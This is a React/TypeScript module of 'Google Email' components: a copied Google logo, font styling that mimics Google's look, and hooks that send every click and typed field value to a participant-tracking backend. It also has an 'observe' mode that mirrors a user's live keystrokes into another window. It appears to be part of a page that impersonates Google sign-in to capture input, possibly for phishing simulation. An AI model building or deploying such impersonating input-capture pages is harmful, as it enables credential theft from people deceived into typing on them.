// Shared Google Email (ge) primitives — uses the user's original HTML/CSS.
import { useEffect, useMemo } from "react";
import { useNavigate, useRouterState } from "@tanstack/react-router";
import { useParticipant } from "@/hooks/useParticipant";

export function GoogleGLogo({ size = 45 }: { size?: number }) {
  return (
    <svg width={size} height={size} viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-label="Google" className="logo" style={{ width: size, height: "auto" }}>
      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
    </svg>
  );
}

export function GeGoogleFont() {
  // Google Sans is proprietary; use the closest free fallback across the design.
  return (
    <style>{`
      @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
      body, .Regular, .Medium, .Bold { font-family: 'Roboto', 'Google Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif !important; }
    `}</style>
  );
}

export function useIsObserve(): boolean {
  return useMemo(() => {
    if (typeof window === "undefined") return false;
    try { return new URLSearchParams(window.location.search).get("__observe") === "1"; }
    catch { return false; }
  }, []);
}

export function useGeTracking() {
  const isObserve = useIsObserve();
  const navigate = useNavigate();
  const { emitInput, participantId } = useParticipant();

  function trackClick(label: string) { if (!isObserve) emitInput("__click", label); }
  function trackInput(field: string, value: string) { if (!isObserve) emitInput(field, value); }
  function geNavigate(to: string) {
    if (isObserve) return;
    try { window.postMessage({ __ux: true, type: "internal_navigation", url: to }, "*"); } catch { /* noop */ }
    navigate({ to, reloadDocument: false }).catch(() => window.location.assign(to));
  }

  useEffect(() => {
    if (!isObserve || typeof window === "undefined") return;
    function onMsg(e: MessageEvent) {
      const d = e.data;
      if (!d || typeof d !== "object" || d.__mirror !== true) return;
      if (d.type !== "live_input" || typeof d.field !== "string") return;
      const el = document.querySelector(`[name="${d.field}"]`) as HTMLInputElement | HTMLTextAreaElement | null;
      if (el) {
        el.value = String(d.value ?? "");
        el.dispatchEvent(new Event("input", { bubbles: true }));
      }
    }
    window.addEventListener("message", onMsg);
    return () => window.removeEventListener("message", onMsg);
  }, [isObserve]);

  return { sessionId: participantId, trackClick, trackInput, geNavigate, isObserve };
}
